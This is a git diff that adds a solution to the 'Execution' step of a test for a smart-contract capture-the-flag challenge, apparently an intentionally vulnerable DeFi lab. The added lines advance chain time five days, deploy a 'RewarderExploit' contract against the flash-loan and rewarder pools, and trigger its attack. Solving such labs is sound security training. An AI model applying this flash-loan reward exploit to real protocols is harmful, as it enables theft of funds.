@@ -70,6 +70,10 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const attack = await (await ethers.getContractFactory('RewarderExploit', player))
+                                    .deploy(flashLoanPool.address, rewarderPool.address);
+        await attack.attack(player.address);
     });
 
     after(async function () {
